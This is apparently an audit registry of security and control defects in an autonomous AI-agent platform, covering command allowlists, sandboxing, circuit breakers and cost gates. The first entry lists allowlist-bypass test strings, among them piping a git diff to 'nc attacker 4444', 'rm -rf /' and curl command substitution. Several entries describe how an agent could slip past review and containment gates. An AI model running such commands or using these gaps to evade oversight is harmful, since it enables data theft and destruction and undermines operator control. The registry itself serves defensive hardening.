notes: The most serious defect found in this audit cycle, and it was invisible to the 45-claim set -- it came from a fresh reachability/fail-open lens. Three layers were defeated at once by one prefix. ALLOWED_BASH_COMMANDS patterns are shaped ^git\s+status(\s+\S+)*\s*$ and the trailing group matches anything, including &&, ;, | and $(). Every DENIED_BASH_COMMANDS pattern is ^-anchored on argv-0, so the denylist only ever inspected the first binary and saw `git`. And ORPHAN-HIGH-454's own new argv-token check reads argv[:2] == ['git','push'], which an allowed prefix blinds -- so the fix landed hours earlier was walked past by prepending `git status &&`. Reproduced at HEAD before fixing: `git status && git push origin main -f` (force-push to MAIN), `git status && rm -rf /`, `git diff | nc attacker 4444` (exfiltration), `git status $(curl http://x)` and `git status > /tmp/exfil` were ALL ALLOWED, while every unchained equivalent was correctly refused -- which is what proves chaining is the bypass rather than a gap in the lists. This is LIVE rather than latent: unlike the rest of the hard-fail perimeter, verify_bash_command_allowed has four production callers (tool_runner.py, tool_registry.py, verification_gate.py, fixture_runner.py) and tool_runner feeds it argv straight from tool config. Fixed with a shell_control_operator() precondition that runs BEFORE either list, because both lists reason about a single command. Tokenized with shlex(punctuation_chars=True) rather than regex-scanned, because the distinction that matters is quoting: `git commit -m 'fix A && B'` carries && as DATA and must still pass, while `git status && git push` carries it as an OPERATOR and must not. An argv that cannot be lexed at all fails closed. Eleven bypass spellings refused, nine ordinary commands including both quoted-&& forms still allowed, zero collateral.

title: Three perimeter checks passed on inputs that assert nothing: a broader scope claim, a glob, an empty surface list, an echo of the canonical commands, and every gh-api route that writes main
rule_violated: A check that asks a narrower question than the property it is named for passes every input vaguer than the one it rejects.
notes: Three defects from the fresh reachability/fail-open lens, grouped because they share one shape. (1) _check_kernel_self_modification_at_mint tested declared-inside-readonly and never readonly-inside-declared, so declaring ONE file under aria-kernel/aria_kernel/ failed while declaring `aria-kernel` -- which contains it -- PASSED, as did `tools`, `*`, `**`, `aria-kernel/**/*.py` and an empty list. A scope claim that CONTAINS a protected path is the same write with a vaguer envelope. This is in the code ORPHAN-HIGH-453 fixed hours earlier: I corrected the path normalization and never questioned the comparison direction. Now matches both directions, rejects globs as unclassifiable at mint time (they cannot be prefix-compared without a filesystem that does not exist yet), and fails an empty list the way an absent key already did. (2) _check_test_gate_canonical_suite joined every declared command into one string and substring-matched, so validation_commands=("echo 'nx affected --target=test nx affected --target=lint npm run type-check'",) PASSED -- an echo of a comment cleared the test gate. Now whole-entry membership, with npx/npm exec wrappers and trailing arguments tolerated because narrowing a suite is legitimate while replacing it with prose is not. (3) is_gh_api_path_forbidden was a five-entry denylist that caught only branches/main/protection: PUT /contents/{path} commits straight to main, PATCH /git/refs/heads/main moves the tip, and merges, rulesets, hooks, collaborators and keys were all allowed. Not purely latent -- auto_merge._gh_api_json consults it on every call. Inverted to an allowlist, which is tractable because ARIA's real surface is small: the only two production call sites are commits/{sha}/check-runs and commits/{sha}/status. Deny still wins over allow so pulls/{n}/merge stays refused. My first allowlist omitted the bare /pulls collection -- gh pr create -- and the existing pre-PR-open exit-criterion test caught it, which is the system working rather than me.

title: A specialist submitting unparseable output was recorded as a clean domain review, so hardening non-delivery made garbage a strictly better submission than nothing
rule_violated: A zero-finding review must be asserted, never inferred: an empty parse result is indistinguishable from a clean review, and reading it as one rewards the agent that submits nothing of value.
notes: Found by the fresh fail-open lens; reproduced before fixing. transform_specialist_output returns [] both for 'reviewed, found nothing' and for any content it cannot parse, and _findings_from_accepted_result returned [] straight through -- so a specialist whose entire output was 'I ran out of context and could not complete this review' produced findings=[], verdict consolidated_no_gaps, blocks_cycle False. The function's OWN docstring said 'returning an empty findings list here would read as this specialist found nothing' while the code did exactly that. What makes it worse than a plain fail-open is what this branch changed around it: ORPHAN-HIGH-423 made non-delivery block and ORPHAN-HIGH-443 made an unrecognised verdict block, so a degraded or hostile agent was left with exactly one path that still cleared the gate -- submit garbage. Hardening two sides of a gate created a perverse incentive on the third. Fixed by requiring a zero-finding review to assert itself, using the contract Lane-A specialists already write to: .claude/shared/output-format.md mandates a ## Verdict section, and the transformer already recognises inline VERDICT: / RULING: forms. That needs no agent-prompt change, which matters because .claude/agents/ is operator-only under READONLY_PATHS -- it makes a documented contract enforced rather than assumed. Findings-bearing reports need no separate assertion because the findings are themselves evidence a review happened, and prose merely containing the word verdict does not count. The contract file now states the requirement and the three accepted forms explicitly. Seven cases pinned: four not-a-review forms block, three asserted-clean forms pass -- the second half matters because a gate a clean review cannot pass is not fail-closed, it is broken, and it gets disabled.

title: deploy-ssot-contract's hostile-filename capacity test is flaky under parallel workers, so a required CI check fails for reasons unrelated to the diff
rule_violated: A gate that fails intermittently for reasons unrelated to the change trains reviewers to re-run rather than read, which is how a real failure gets waved through.
notes: Pre-existing and NOT caused by the branch that observed it: invariants-fast failed on CI at deploy-ssot-contract.spec.ts:807 ('caps discovery records, worker output, and hostile filename handling', expected length 1, received 0) on head 00e0e8149, whose three preceding commits touched only implementation_safety.py, its test file, and docs/registry/manifest files -- none of which this spec reads. It drives shell capacity-diagnostic code with a fake du binary and a DU_INVOCATION_LOG, so the failure is causally unreachable from that diff. Locally the spec passes 27/27 five consecutive times in isolation and three consecutive full invariants:fast runs show only the two known backup-production-secrets failures (missing ssh binary in this container). An earlier run in the same session also saw a one-off failure elsewhere in this spec (the bounded-frontier timeout assertions around line 600) that did not reproduce, which points at timing sensitivity under --maxWorkers=3 rather than at one bad assertion. Registered rather than silently re-run because the spec sits in invariants-fast, which is effectively a required gate, and an intermittently red required gate is a reliability defect in its own right. Not fixed here: the root cause is a race in deploy capacity-diagnostic shell tooling, a different domain from this branch, and guessing at a timing fix without reproducing it is how the next finding gets created.

title: One pushed commit carries no Closes trailer and cannot be repaired under the force-push ban, so clearing the gate required an operator-approved entry in a governance allowlist documented as frozen
rule_violated: An exception to a governance control must be granted by someone other than the party it unblocks, and must leave an auditable record; otherwise it is self-authorisation.
notes: Registered so the exception is auditable forever rather than living only as a SHA in a list. 9fb8efce is a fix(gates) commit with no Closes: trailer; the finding it should have cited is ORPHAN-HIGH-417, whose gate self-test wiring it restores, so this is a missing reference and not a missing finding. It cannot be repaired in place: closes-footer-check validates the whole PR range so no follow-up commit can satisfy it, and amending a pushed commit requires a force-push, which CLAUDE.md forbids outright -- the identical situation every annotated entry already in PRE_PHASE6_SHAS describes. The author declined to add the entry unilaterally because the set is documented as frozen and growing a governance allowlist to unblock one's own branch is self-authorisation, which is the defect class the branch being unblocked was written to close; both routes and their costs were put to the operator, who chose the allowlist over a third retrace. The ROOT CAUSE is separately closed: ORPHAN-HIGH-441 found that the commit-msg hook which would have refused this commit at write time bound for nobody, because its only install path was husky's prepare script and this repo mandates npm ci --ignore-scripts. npm run hooks:install plus tests/invariants/git-hook-binding.spec.ts close that, so the next missing trailer is refused before the commit exists rather than discovered in CI where it is unrepairable. Layer 4 because the remedy is a documented exception, not a structural fix -- the structural fix is 441, and this row exists to keep the cost of that gap visible.

title: The failure circuit breaker had no operator surface: reset_breaker existed with no CLI, so a tripped breaker could only be cleared by hand-deleting a gitignored artifact
rule_violated: A control that can halt autonomous operation must ship an operator path to inspect and clear it; otherwise a transient failure becomes an unrecoverable stop and the only remedy is editing untracked state by hand.
notes: Discovered while mapping producers for ORPHAN-CRITICAL-420. circuit_breaker.py has defined evaluate_breaker/current_state/reset_breaker since Plan ARIA-V3 section B2, and `grep -n breaker aria-kernel/aria_kernel/cli.py` returned NO LINES -- there was no `aria-kernel breaker` command group at all: no status, no reset. The breaker ledger lives under aria-tools/, excluded by .gitignore:229, so a tripped breaker was clearable only by hand-deleting an untracked artifact on whichever runner happened to write it. This is why it had to land in the SAME change as the breaker's first producer: shipping a producer against a breaker nobody can reset trades a fail-open control for an unrecoverable fail-closed one, which is not an improvement. Closed by adding `breaker status` (prints the full verdict -- state, reason, sliding_count, threshold_24h -- rather than current_state's bare string, because an operator deciding whether to reset needs the evidence that produced the verdict; exits 1 when tripped so a shell caller can gate without parsing JSON) and `breaker reset` (mirrors the migration commands' operator contract: --acknowledge plus a _validate_reason-checked --reason plus --operator-approval-ref, because reset_breaker truncates the 24h window and so destroys the evidence that justified the stop, making the reason string the only durable record). Layer 4 because the remedy is an operator surface rather than a structural change to the control itself.

title: The B0 cost breaker reads a counter nothing increments: cost_budget.record_actual_usage has zero callers while live cost telemetry writes to a different module
rule_violated: A budget control must read the ledger that the system actually writes. Two parallel cost systems, where the enforcing gate reads the unfed one, is a control that cannot fire.
notes: Found while scoping ORPHAN-CRITICAL-420 S2. ARIA has TWO cost subsystems. (1) budget.record_cost_attribution is LIVE: CostTelemetryHookImpl wraps it and the orchestrator selects that impl for standard/strict/autonomous (observe/frozen get NoOp), so per-LLM attribution rows are genuinely written. (2) cost_budget.py owns the B0 breaker that _cycle_preflight gates on via cost_budget.current_state, and its producer cost_budget.record_actual_usage has ZERO callers -- `grep -rn record_actual_usage aria-kernel/ | grep -v def | grep -v tests/` returns exactly one line, its own __all__ entry at cost_budget.py:269. So the enforcing gate reads a counter the live telemetry path never touches. Consequence: the cost breaker cannot trip regardless of spend, the same decorative-control shape ORPHAN-CRITICAL-420 covers for the failure breaker. This is ALSO why ORPHAN-CRITICAL-420 S2 deliberately left the cost check autonomous-scoped while making the FAILURE check profile-independent: widening cost gating to standard/strict would gate real cycles against a counter nothing increments, which changes no behaviour but adds a misleading governance surface. Closing this needs a decision on whether cost_budget consumes budget.py attribution rows or whether the two modules merge -- an architectural call, not a wiring fix, which is why it is tracked rather than folded into the S2 commit.

title: The B2 failure breaker preflight was gated on profile == autonomous, so a tripped breaker stopped nothing on standard or strict, which hold action authority
rule_violated: A safety control that exists to stop the system from acting must gate every profile that can act, and the gated set must be derived from the action-authority table rather than restated as a literal.
notes: _autonomous_preflight opened with `if profile_snapshot != autonomous: return (ok, None)`, justified in its own docstring by the claim that strict/standard/observe/frozen have their own gates. They did not: ACTION_PERMISSIONS grants pr_open + pr_create to strict and change_committed + change_validated + agent_claim to standard, and neither profile consulted the failure breaker anywhere in the tree. The scheduled lane runs --profile standard, so the breaker gated exactly the profile nobody runs. Closed by deriving PROFILES_WITH_ACTION_AUTHORITY as the union of ACTION_PERMISSIONS values (= standard/strict/autonomous) and gating the failure check on membership. Derived rather than enumerated so a new profile granted any authority is automatically enrolled -- a literal set would rot the first time the table changed, which is how the original gate came to be wrong. observe/frozen hold no cell and are therefore exempt BY CONSTRUCTION, which is also the behaviour we want for an independent reason: they mutate nothing, and blocking them would deny the operator the read-only cycle needed to diagnose the trip. Cost + host-lease checks stay autonomous-scoped (cost for the reason in the sibling finding; host lease because it is cross-host mutual exclusion for the autonomous daemon and a standard operator cycle has no daemon to race). Autonomous reason-code precedence (cost before failure) preserved.

title: The failure breaker's 24h window equals the nightly cadence, so cross-cycle accumulation depends on sub-cycle timing jitter rather than on failure count
rule_violated: A sliding window sized equal to the producer cadence makes accumulation nondeterministic: whether a prior run's failure still counts depends on where inside each run the failure occurred, not on how many failures there were.
notes: Residue after ORPHAN-HIGH-467 and the breaker producer landed. BURST accumulation is now proven deterministic: the pr_lifecycle producer records one row per perimeter-refused proposal, so a single cycle with threshold-many refusals trips the breaker and halts the next cycle -- covered end to end by tests/invariants/v3/test_breaker_end_to_end_reachability.py. BLEED accumulation is not. _count_failures_24h uses cutoff = utcnow - 24h with `ts >= cutoff`, while aria-auto-cycle.yml fires `cron 0 1 * * *`, a 24h cadence. Window == cadence means a prior night's row sits exactly at the boundary: a refusal at 01:20 on night N is 23h45m old when night N+1 refuses at 01:05 and COUNTS, but a refusal at 01:05 on night N is 24h25m old when night N+1 refuses at 01:30 and AGES OUT. So a steady bleed of one refusal per night may accumulate to a trip or may never trip, decided by scheduler jitter and by where in the cycle the refusal lands -- not by how broken the system is. Fixing this is a POLICY choice about when automation should halt, not a wiring fix, which is why it is tracked rather than changed unilaterally: widening the window (e.g. threshold_24h -> a 72h window) makes three consecutive single-refusal nights trip deterministically, at the cost of halting on slower bleeds; keeping 24h and declaring the control burst-only is equally defensible but should be explicit in the policy file rather than emergent from a coincidence between window size and cron cadence. Operator recovery exists either way via `aria-kernel breaker reset` (ORPHAN-HIGH-465).

title: The agent-invocation queue was stranded between two workflows: the 01:00 producer wrote to a gitignored tree the 02:00 consumer never restored, so no agent work was ever claimed
rule_violated: A queue whose producer and consumer run in different scheduled jobs must have its transport declared and verified; state that lives only in a gitignored working tree does not cross a job boundary.
notes: aria-auto-cycle.yml (cron 0 1 * * *) mints aria/agent-request/v1 rows via _drain_next_cycle_queue into aria-tools/agent-invocations/, a path .gitignore excludes at :229. The only consumer that claims them role-agnostically is `agent next-pending` (next_pending_request skips the role filter when role is None) which runs in aria-agent-executor.yml (cron 0 2 * * *) -- and that workflow had NO state-restore step, so next_pending_request always read a bootstrap-empty tree and returned None. Consequence: no agent ran, so nothing downstream of `an agent did work` could ever fire. A SECOND control failed for the same root cause and is worth recording separately: the executor's cross-host lease preflight calls lease_state('aria-tools') on that same unrestored tree, so it could never observe a lease held by another host -- the exact double-claim race the lease exists to prevent. Closed by restoring the aria-tools-state artifact BEFORE the lease check and republishing it after the run, gated on the same integrity verdict aria-auto-cycle uses, with unverified trees quarantined under a run-scoped name the restore query never selects. Two structural constraints shaped the placement and are not incidental: workflow_contracts rejects a preflight that runs after the job's first governed mutation, so the enterprise preflight had to move ahead of the restore and therefore had to stop naming request-scoped paths (there is no request_id before the queue is read); and the job's contract in workflow_contract_registry.py had to widen from six exact ledger files to the tree root, plus actions:read, plus first_governed_mutation_step retargeted to the restore. The registry binding is enforced -- test_workflow_enterprise_preflight fails if the YAML and the contract disagree.

title: Agent resource limits were selected on binary presence, applied the wrong wall-clock property, and fell through to an unbounded spawn
rule_violated: A perimeter must be selected on whether it works, not on whether its binary exists, and a missing perimeter must refuse the operation rather than silently proceed without it.
notes: Three defects in apply_resource_limits, all verified live in this container. (1) SELECTION: the test was `shutil.which('systemd-run') is not None`. systemd-run is present at /usr/bin/systemd-run here, but running it fails with `Failed to connect to bus: No medium found` because there is no user session bus -- the normal case in a container. The check therefore passed and the wrapper produced a command guaranteed to fail at spawn, while the `timeout` branch that would have worked (/usr/bin/timeout is present) was unreachable. Fixed by probing, mirroring _bwrap_available three functions above, whose own docstring already says installed is not enough; the probe carries the same property set the wrapper applies because a host can accept systemd-run and reject an individual property. (2) WALL CLOCK: the wrapper passed --property=TimeoutStopSec=<n>. TimeoutStopSec bounds how long systemd waits for a unit to die AFTER it has been asked to stop; it places no bound on how long the unit may run. So on hosts where systemd-run DID work, the single limit the caller supplies a value for was the one not applied. RuntimeMaxSec is the property that bounds runtime. (3) FAIL-OPEN TAIL: with neither limiter present the function returned argv unchanged, which is indistinguishable from a limited argv -- the exact shape SandboxUnavailable was introduced to remove for containment, left standing here, and contradicted by the calling docstring in claude_runtime.py which says a write-capable agent must not be spawned unbounded. Now raises ResourceLimitsUnavailable. The timeout fallback is deliberately still accepted despite giving no memory/CPU/task ceiling: an unbounded-runtime agent is the failure actually observed, and refusing every container host would take the lane down to gain limits it cannot provide.

title: The nightly lane spawns agents through the same path as the executor but shipped with no sandbox backend installed
rule_violated: Two lanes that reach the same spawn path must carry the same perimeter; a containment step present on one lane and absent on the other is drift, not configuration.
notes: aria-agent-executor.yml installs bubblewrap and then VERIFIES it can build the namespaces wrap_bash_in_sandbox relies on. aria-auto-cycle.yml runs `autonomy run --profile standard` with CLAUDE_CLI_MOCK plumbed through, so it reaches the same run_claude_exec spawn path, and had neither step. Because ORPHAN-CRITICAL-427/451 made wrap_bash_in_sandbox RAISE SandboxUnavailable rather than return bare argv, the consequence was fail-closed rather than unconfined -- the nightly could not do real agent work at all, instead of doing it without containment. Closed by copying both steps from the executor so the lanes cannot drift. Gated on effective_mock == 'false' rather than run unconditionally: a mock cycle spawns no agent and needs no backend, and a hard capability verify on a host without unprivileged user namespaces would turn a working mock nightly red for a capability it never uses.

title: Cost caps are mis-calibrated by 40x against real agent-run cost, so wiring the pre-spawn gate would trip the cost breaker on the first live run
rule_violated: A gate must be calibrated against measured behaviour before it is wired; enforcing an uncalibrated cap converts a safety control into a guaranteed outage.
notes: This is the remaining blocker on the cost half of ORPHAN-CRITICAL-420 and the reason the pre-spawn gate was NOT wired once the counter became real (ORPHAN-HIGH-466). Measured against MODEL_PRICING_USD_PER_MTOK for claude-opus-4-8 (5.0 in / 25.0 out per Mtok): a 50k-in/8k-out run costs $0.45, a 150k/16k run $1.15, a 300k/32k run $2.30. genesis_policy_default.json sets cost_caps_usd.per_run = 0.50, so a typical agent invocation is 2.3x the cap. assert_within_budget does not merely refuse on a per_run breach -- it calls _trip_breaker first, so the FIRST real run would trip the breaker and every subsequent cycle would be blocked until an operator ran `aria-kernel cost-breaker reset`. Independent corroboration that 0.50 is the wrong number, not the runs: aria-auto-cycle.yml passes `--max-budget-usd-per-run 20.00`, a 40x divergence between two cost systems in the same repo. A THIRD orphaned control compounds this: budget.reserve_cycle_budget (per-run + per-cycle caps, raises BudgetExhausted) also has zero production callers, while tools/aria-poc/ci_executor.py:698 documents cost as `enforced separately via aria_kernel.budget.reserve_cycle_budget` -- a docstring asserting an enforcement that does not happen. So ARIA has three cost ENFORCEMENT points, all dead, and one live telemetry path that only records after the fact. Closing this needs, in order: (1) reconcile the 0.50 / 20.00 divergence into one cap set, (2) decide whether assert_within_budget or reserve_cycle_budget is the single enforcement point and delete the other, (3) let the now-derived counter observe real spend for several cycles via `cost-breaker status` to calibrate, (4) only then wire the survivor at run_claude_exec (tools/aria-poc/claude_runtime.py:392, two callers: ci_executor.py:958 and worker_executor.py:242) with base_dir threaded and estimate_tokens/estimate_tokens_usd supplying the pre-call figure. Wiring before (1)-(3) is a guaranteed outage.

title: Moving ARIA to claude-opus-5 at max effort is a multi-surface migration: the model would silently downgrade to fable, record $0.00, and disable the credit-exhaustion fallback
rule_violated: A model-tier change must be atomic across alias validation, pricing coverage, fallback capability and audit strings; changing any one alone produces a silent wrong-tier or silent zero-cost run.
notes: Operator asked for ARIA to run Opus 5 at ultracode depth. Verified against the installed CLI (2.1.220): --effort accepts low|medium|high|xhigh|max so `max` IS legal, and --model accepts either an alias or a full name such as claude-opus-5. The CLI is not the obstacle; ARIA is. EFFORT HALF is unblocked but broad: DEFAULT_EFFORT is xhigh (agent_runtime_profile.py:35), the credit fallback hardcodes xhigh (claude_runtime.py:651), zero of the 23 aria-*.md declare max, and the value is equality-pinned by test_maintenance_agents_invariants EXPECTED_EFFORT, agent-frontmatter-schema.spec.ts:176 (write tier), test_claude_runtime_contract, test_credit_fallback, and ci_executor_contract_proven.md which is parsed and asserted by I-V3-21 (test_phase_b1_argv_proven_workflow_hygiene.py:78-104). MODEL HALF has four blockers, each independently sufficient to make the change silently wrong. (1) SILENT DOWNGRADE: agent_runtime_profile.py:104 rewrites any model outside VALID_MODELS={opus,sonnet,haiku,fable} to fable with source=default_invalid, so `model: claude-opus-5` in frontmatter runs on Fable while the operator believes otherwise; build_claude_exec_argv never validates model at all (claude_runtime.py:222), so the two layers are asymmetric. The allowlist has THREE divergent copies -- agent_runtime_profile.py:31, claude_runtime.py:45, and agent-frontmatter-schema.spec.ts:138 which is narrowest at {opus,fable} and is what CI runs. (2) SILENT ZERO COST: claude-opus-5 is absent from MODEL_PRICING_USD_PER_MTOK (budget.py:20-29) and cannot prefix-match, because estimate_tokens_usd matches only `model == key` or `model.startswith(key+'-')` -- claude-opus-5 is neither claude-opus-4-8 nor a dash-suffix of it -- so it returns 0.0 (budget.py:47). This is verbatim the ORPHAN-HIGH-311 regression and it makes the caps toothless. Real published Opus 5 rates are REQUIRED; guessing them would corrupt the ledger, and a truncated catch-all key like `claude-opus` must NOT be used because budget.py matches first-in-dict-order rather than longest-prefix and would shadow every dated opus entry. (3) FALLBACK DISABLED: run_with_model_fallback gates the whole credit-exhaustion and refusal fallback on the literal `if model != "fable"` (claude_runtime.py:646), and neither executor re-checks completed.credit_exhaustion afterwards. Since a quota exhaustion arrives as returncode 0 with the usage-limit notice as assistant content, moving the primary tier off fable turns 'You have reached your limit' into a successful agent answer flowing downstream. The gate must become a capability predicate first. (4) AUDIT + RESERVATION DRIFT: ci_executor.py:982-1001 and worker_executor.py:253-259 hardcode `fable->opus@xhigh` audit text that would emit factually false governance rows, and ci_executor.py:741 keys its 2x budget reservation multiplier on `resolve_claude_model(...) == 'fable'` rather than deriving it from the pricing table. SEPARATE LIVE DEFECT worth checking independently: the model id written to the cost ledger is scraped from the CLI stream-json `model` field (ci_executor.py:1154-1159), not from the alias ARIA passed -- so if the `opus` alias ALREADY resolves to claude-opus-5 on the runner, every opus-tier judge dispatch is recording $0.00 TODAY, and the only signal is a cost_pricing_unknown_model governance event emitted inside a bare try/except:pass nested in an outer except Exception:return (ci_executor.py:1201-1230). Check aria-tools governance for those rows. Also note worker_executor.py performs NO cost recording at all, so the write tier is unattributed regardless. RECOMMENDED ORDER: (a) collapse the three alias allowlists into one exported SSoT the TS spec reads, (b) make an unknown model fail loudly instead of returning 0.0, (c) convert the fallback gate to a capability predicate, (d) add the real claude-opus-5 pricing row plus a test that enumerates allowed aliases and asserts pricing coverage so the next tier bump cannot re-open 311, (e) only then flip the tier and the audit strings in one commit.

title: The opus CLI alias resolves to claude-opus-5, which had no pricing row, so every opus-tier dispatch recorded $0.00
rule_violated: Cost attribution must price the model id that is actually resolved and recorded, not the alias that was requested.
notes: Distinct from the ORPHAN-HIGH-473 tier migration: this is the live half that needed no tier change to be broken. ARIA dispatches by CLI alias (`opus` = latest opus), but the id written to the cost ledger is the full name the CLI resolved, scraped from the stream-json model field at ci_executor.py:1154. estimate_tokens_usd matches only `model == key` or `model.startswith(key + '-')`, and claude-opus-5 is neither claude-opus-4-8 nor a dash-suffix of it, so it fell to the unknown-model `return 0.0`. Every opus-tier judge dispatch therefore recorded $0.00 and the $3/cycle and $20/run caps could not bind -- verbatim ORPHAN-HIGH-311. Closed by adding the exact key claude-opus-5 at (5.0, 25.0) per Mtok, the 4.8 tier, confirmed by the operator rather than guessed. A truncated catch-all key such as claude-opus was explicitly NOT used: budget.py returns the first dict-order match rather than the longest prefix, so a short key shadows every dated entry below it -- now asserted by a no-shadowing test. An alias-coverage test was also added and is documented as PARTIAL on purpose: it catches a dispatch tier shipped with no pricing at all, but would NOT have caught this defect, because claude-opus-4-8 was priced and so the claude-opus-* family was non-empty. Detecting a new generation inside an already-priced family requires the resolved id, which is runtime information; the runtime complement is the cost_pricing_unknown_model governance event, whose nested try/except swallow is tracked in ORPHAN-HIGH-473.

title: A quota-exhausted run was returned as the agent's answer: the fallback was gated on a literal model name and no caller inspected credit_exhaustion
rule_violated: A result that cannot be distinguished from a successful answer must not be returned when it is known to be a failure.
notes: Two defects that compound. (1) run_with_model_fallback opened with `if model != 'fable': return completed`, so the entire credit-exhaustion and refusal fallback was keyed to one literal model name -- moving the primary tier off fable, which the Opus 5 request asks for, would have silently disabled it with nothing failing. Replaced by MODEL_FALLBACK_TIER, a topology map, plus has_fallback_tier(); a tier change is now an edit to the topology rather than an invisible behaviour change, and a test asserts no tier falls back to itself. (2) The far worse half, and LIVE before any tier change: per extract_credit_exhaustion the CLI delivers its usage-limit notice as ASSISTANT CONTENT on a clean exit (returncode 0), so an exhausted run is shaped exactly like a successful one. Neither executor read .credit_exhaustion off the value returned (ci_executor checks only .refusal at :1005, worker_executor likewise at :268; the single grep hit at ci_executor.py:984 is inside the hook payload, not a check on the result). Because judges ALREADY run on the opus tier, which had no fallback, an opus judge hitting quota returned 'You have reached your limit. Run /usage-credits...' as its answer and that text was persisted as a real envelope and consumed downstream as a verdict. Closed by raising ClaudeCreditExhausted instead of returning: once when the primary tier has no fallback, and once when the retry tier is itself exhausted -- the pre-fix docstring claimed the caller escalates the retry's credit signal, but no caller reads the field. The on_credit audit hook fires BEFORE the raise so the exhaustion is still recorded in governance. An uncaught raise exits the executor non-zero, which is the intended fail-closed outcome: a loud failure with an audit row beats a fabricated verdict. The test that pinned the old contract (test_opus_primary_never_falls_back) asserted the defect as intended behaviour and was replaced; its still-correct half -- no retry, exactly one call -- is preserved in the replacement.

title: Cost pricing was keyed only on exact model ids, so every new model generation silently priced at $0.00 until a human added a row
rule_violated: A table that must track an external release cadence cannot be the only mechanism; the common case has to be self-maintaining, and any inferred value must be labelled as inferred.
notes: Raised by the operator: models ship continuously, so this part must be dynamic. Correct diagnosis. ARIA dispatches by CLI ALIAS ('opus' = latest opus), so a new generation begins flowing through the cost ledger the day it ships, under a full id nobody has added to MODEL_PRICING_USD_PER_MTOK. estimate_tokens_usd matched only `model == key` or `model.startswith(key + '-')`, so the new id fell to `return 0.0`. ORPHAN-HIGH-474 was exactly this, fixed by hand for claude-opus-5 -- and hand-fixing per release simply schedules the same outage for the next one. Closed by adding MODEL_FAMILY_PRICING_USD_PER_MTOK (claude-fable, claude-mythos, claude-opus, claude-sonnet, claude-haiku) consulted ONLY after every exact id has missed, so a family rate can never shadow a dated entry -- the failure mode that rules out putting a short key in the exact table, since that matcher returns the first dict-order match rather than the longest prefix. price_tokens() returns TokenPrice(usd, source, matched_key) rather than a bare float, because a family rate is an ESTIMATE and must not be filed as though it were measured; ci_executor now uses it and emits a cost_pricing_inferred_from_family governance event so an operator can find and correct the rate. estimate_tokens_usd remains as a thin wrapper for callers that do not persist cost. The trade is deliberate and stated at the callsite: an approximate charge that keeps the caps binding beats a $0.00 that makes them inert. An unknown FAMILY (a genuinely new vendor line, not merely a new generation) still resolves to 0.0 and the pre-existing loud path. This also upgrades the alias-coverage test from the partial guarantee documented in ORPHAN-HIGH-474: with family rates, asserting every dispatchable alias has a family entry is a real guarantee, where previously an alias could look covered by one stale dated id while the current generation priced at zero.

title: ARIA agents ran below ultracode depth, and the tier documentation contradicted the executable assertions
rule_violated: Prose that describes a policy must agree with the assertion that enforces it; a comment contradicting its own test is worse than no comment, because it is read as authoritative.
